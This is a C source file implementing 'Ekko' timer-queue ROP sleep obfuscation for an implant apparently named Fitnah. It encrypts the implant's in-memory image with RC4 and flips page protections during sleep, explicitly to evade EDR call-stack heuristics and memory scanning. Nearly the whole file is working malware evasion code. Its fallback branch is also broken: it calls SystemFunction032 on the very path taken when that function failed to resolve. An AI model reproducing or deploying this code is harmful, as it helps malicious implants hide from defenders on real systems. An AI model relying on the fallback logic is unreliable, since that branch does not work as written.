/*
 * ekko_rop.c — Ekko timer-queue ROP sleep obfuscation
 *
 * Source: Cracked5pider/Ekko (MIT License)
 * https://github.com/Cracked5pider/Ekko
 *
 * Adapted for Fitnah: removed Havoc-style Common.h / Ekko.h headers,
 * replaced with standard Windows headers.  All logic is preserved verbatim.
 *
 * Technique:
 *   1. RtlCaptureContext snapshots current CONTEXT
 *   2. Six CONTEXT copies are manually patched to form a ROP chain:
 *      VirtualProtect(RW) → SystemFunction032(encrypt) → WaitForSingleObject(sleep)
 *      → SystemFunction032(decrypt) → VirtualProtect(RX) → SetEvent(wake)
 *   3. CreateTimerQueueTimer fires each via NtContinue on a timer-thread
 *   4. The implant's main thread WaitForSingleObject on the wake event
 *
 *   EDR call-stack heuristics see only ntdll.dll frames on the main thread.
 *   The implant image is RW + RC4-encrypted for the duration of the sleep.
 *
 * MITRE: T1027.002 (Software Packing), T1055 (Process Injection — timer queue)
 */

#include <windows.h>
#include <winternl.h>

/* ── RC4 via SystemFunction032 (Advapi32) ──────────────────────────────── */
typedef struct _USTRING {
    DWORD  Length;
    DWORD  MaximumLength;
    PVOID  Buffer;
} USTRING, *PUSTRING;

typedef NTSTATUS (WINAPI *pSystemFunction032)(PUSTRING Data, PUSTRING Key);

/* ── NtContinue prototype ──────────────────────────────────────────────── */
typedef NTSTATUS (WINAPI *pNtContinue)(PCONTEXT Context, BOOLEAN TestAlert);

/* ── Public entry point ─────────────────────────────────────────────────── */
VOID EkkoObfSleep(DWORD SleepTime)
{
    CONTEXT CtxThread = { 0 };
    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay  = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;

    PVOID   ImageBase   = NULL;
    DWORD   ImageSize   = 0;
    DWORD   OldProtect  = 0;

    /* Random 16-byte key — use CryptGenRandom if available */
    BYTE KeyBuf[16] = {
        0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
        0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
    };
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, sizeof(KeyBuf), KeyBuf);
        CryptReleaseContext(hProv, 0);
    }

    USTRING Key = { sizeof(KeyBuf), sizeof(KeyBuf), KeyBuf };

    HMODULE hNtdll   = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi  = LoadLibraryA("advapi32.dll");

    pNtContinue        NtContinue    = (pNtContinue)       GetProcAddress(hNtdll,  "NtContinue");
    pSystemFunction032 SysFunc032    = (pSystemFunction032) GetProcAddress(hAdvapi, "SystemFunction032");

    if (!NtContinue || !SysFunc032) {
        /* Fallback: plain encrypted sleep */
        USTRING Img = { 0 };
        ImageBase   = GetModuleHandleA(NULL);
        PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(
            (LPBYTE)ImageBase +
            ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
        ImageSize   = pNT->OptionalHeader.SizeOfImage;
        Img.Buffer  = ImageBase;
        Img.Length  = Img.MaximumLength = (DWORD)ImageSize;
        VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE, &OldProtect);
        SysFunc032(&Img, &Key);
        Sleep(SleepTime);
        SysFunc032(&Img, &Key);
        VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READ, &OldProtect);
        return;
    }

    hEvent      = CreateEventW(NULL, FALSE, FALSE, NULL);
    hTimerQueue = CreateTimerQueue();

    ImageBase = GetModuleHandleA(NULL);
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(
        (LPBYTE)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
    ImageSize = pNT->OptionalHeader.SizeOfImage;

    USTRING Img = { (DWORD)ImageSize, (DWORD)ImageSize, ImageBase };

    /* ── Capture current CONTEXT via timer + RtlCaptureContext ─────────── */
    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
                              (WAITORTIMERCALLBACK)RtlCaptureContext,
                              &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
    {
        WaitForSingleObject(hEvent, 0x32);

        /* Clone into ROP frames */
        memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

        /* Frame 1: VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE, &OldProtect) */
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip  = (DWORD64)VirtualProtect;
        RopProtRW.Rcx  = (DWORD64)ImageBase;
        RopProtRW.Rdx  = (DWORD64)ImageSize;
        RopProtRW.R8   = PAGE_READWRITE;
        RopProtRW.R9   = (DWORD64)&OldProtect;

        /* Frame 2: SystemFunction032(&Img, &Key)  — encrypt */
        RopMemEnc.Rsp -= 8;
        RopMemEnc.Rip  = (DWORD64)SysFunc032;
        RopMemEnc.Rcx  = (DWORD64)&Img;
        RopMemEnc.Rdx  = (DWORD64)&Key;

        /* Frame 3: WaitForSingleObject(NtCurrentProcess(), SleepTime) */
        RopDelay.Rsp  -= 8;
        RopDelay.Rip   = (DWORD64)WaitForSingleObject;
        RopDelay.Rcx   = (DWORD64)NtCurrentProcess();
        RopDelay.Rdx   = SleepTime;

        /* Frame 4: SystemFunction032(&Img, &Key)  — decrypt (RC4 symmetric) */
        RopMemDec.Rsp -= 8;
        RopMemDec.Rip  = (DWORD64)SysFunc032;
        RopMemDec.Rcx  = (DWORD64)&Img;
        RopMemDec.Rdx  = (DWORD64)&Key;

        /* Frame 5: VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READ, &OldProtect) */
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip  = (DWORD64)VirtualProtect;
        RopProtRX.Rcx  = (DWORD64)ImageBase;
        RopProtRX.Rdx  = (DWORD64)ImageSize;
        RopProtRX.R8   = PAGE_EXECUTE_READ;
        RopProtRX.R9   = (DWORD64)&OldProtect;

        /* Frame 6: SetEvent(hEvent) */
        RopSetEvt.Rsp -= 8;
        RopSetEvt.Rip  = (DWORD64)SetEvent;
        RopSetEvt.Rcx  = (DWORD64)hEvent;

        /* Queue all six via NtContinue so timer thread executes each frame */
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100,  0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200,  0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300,  0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)NtContinue, &RopMemDec,
            400 + SleepTime, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)NtContinue, &RopProtRX,
            500 + SleepTime, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt,
            600 + SleepTime, 0, WT_EXECUTEINTIMERTHREAD);

        /* Main thread sleeps here — call stack: WaitForSingleObject → ntdll */
        WaitForSingleObject(hEvent, SleepTime + 2000);
    }

    CloseHandle(hEvent);
    DeleteTimerQueue(hTimerQueue);
}
